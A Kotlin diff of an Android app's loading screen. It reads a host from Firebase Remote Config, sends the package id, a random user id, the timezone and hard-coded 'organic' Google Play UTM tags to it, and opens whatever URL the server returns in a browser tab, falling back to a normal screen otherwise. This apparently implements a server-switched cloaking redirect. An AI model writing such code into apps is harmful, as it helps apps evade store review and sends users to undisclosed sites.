@@ -11,25 +11,32 @@ import androidx.browser.customtabs.CustomTabColorSchemeParams
 import androidx.browser.customtabs.CustomTabsIntent
 import androidx.compose.runtime.collectAsState
 import androidx.compose.runtime.getValue
+import androidx.lifecycle.coroutineScope
 import com.google.firebase.ktx.Firebase
 import com.google.firebase.remoteconfig.ktx.remoteConfig
 import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
 import com.template.ui.theme.Server_v1Theme
 import com.template.ui.theme.StartScreen
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.MutableStateFlow
-import kotlinx.coroutines.flow.StateFlow
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+import java.io.InputStream
+import java.io.InputStreamReader
+import java.net.HttpURLConnection
+import java.net.URL
 import java.util.*
 
 
 class LoadingActivity : ComponentActivity() {
-    val showLoading : MutableStateFlow<Boolean> = MutableStateFlow(true)
+    val showLoading: MutableStateFlow<Boolean> = MutableStateFlow(true)
 
     override fun onCreate(savedInstanceState: Bundle?) {
 
         super.onCreate(savedInstanceState)
         setContent {
             val isShow by showLoading.collectAsState()
-            if(isShow){
+            if (isShow) {
                 Server_v1Theme {
                     StartScreen()
                 }
@@ -40,7 +47,7 @@ class LoadingActivity : ComponentActivity() {
         if (savedHost == null && Utils.isNetworkAvailable()) {
             Log.e("LoadingActivity", "fetch")
             fetchConfig()
-        } else if(!savedHost.isNullOrEmpty() && Utils.isNetworkAvailable()){
+        } else if (!savedHost.isNullOrEmpty() && Utils.isNetworkAvailable()) {
             Log.e("LoadingActivity", "saved Host $savedHost")
             showLoading.value = false
             openCustomTab()
@@ -66,12 +73,19 @@ class LoadingActivity : ComponentActivity() {
                 Log.e("LoadingActivity", "fetch $task")
                 if (task.isSuccessful) {
                     val host: String = remoteConfig.getString("check_link")
+
+                    Log.e("LoadingActivity", host)
                     val url =
                         "$host/?packageid=${this.packageName}&usserid=${UUID.randomUUID()}&getz=${TimeZone.getDefault().id}&getr=utm_source=google-play&utm_medium=organic"
-
-                    PrefManager.setUrl(url)
-
-                    openCustomTab()
+                    if (host.isNotEmpty()) {
+                        PrefManager.setUrl(url)
+                        lifecycle.coroutineScope.launch(Dispatchers.IO) {
+                            obtainUrl(url)
+                        }
+                    } else {
+                        PrefManager.setUrl("")
+                        startActivity(Intent(this, MainActivity::class.java))
+                    }
 
                 } else {
                     showLoading.value = false
@@ -81,10 +95,12 @@ class LoadingActivity : ComponentActivity() {
             }
             .addOnFailureListener {
                 Log.e("LoadingActivity", "err ${it.message}")
+                PrefManager.setUrl("")
+                startActivity(Intent(this, MainActivity::class.java))
             }
     }
 
-    private fun openCustomTab(){
+    private fun openCustomTab() {
         val url = PrefManager.getUrl()
         Log.e("LoadingActivity", "$url")
 
@@ -93,7 +109,31 @@ class LoadingActivity : ComponentActivity() {
             .build()
         val builder = CustomTabsIntent.Builder().setDefaultColorSchemeParams(defaultColors)
 
+                builder.build().launchUrl(this, Uri.parse(url))
+    }
 
-        builder.build().launchUrl(this, Uri.parse(url))
+    private fun obtainUrl(host: String) {
+        Log.e("url", host)
+
+        val connection = URL(host).openConnection() as HttpURLConnection
+        try {
+            val data = connection.inputStream.bufferedReader().use { it.readText() }
+            PrefManager.setUrl(data)
+            lifecycle.coroutineScope.launch(Dispatchers.IO) {
+                withContext(Dispatchers.Main) {
+                    openCustomTab()
+                }
+            }
+            Log.e("data", "$data")
+        }
+        catch (e: Exception) {
+            e.printStackTrace()
+            PrefManager.setUrl("")
+            startActivity(Intent(this, MainActivity::class.java))
+            Log.e("e.message", "${e.message}")
+        }
+        finally {
+            connection.disconnect()
+        }
     }
 }
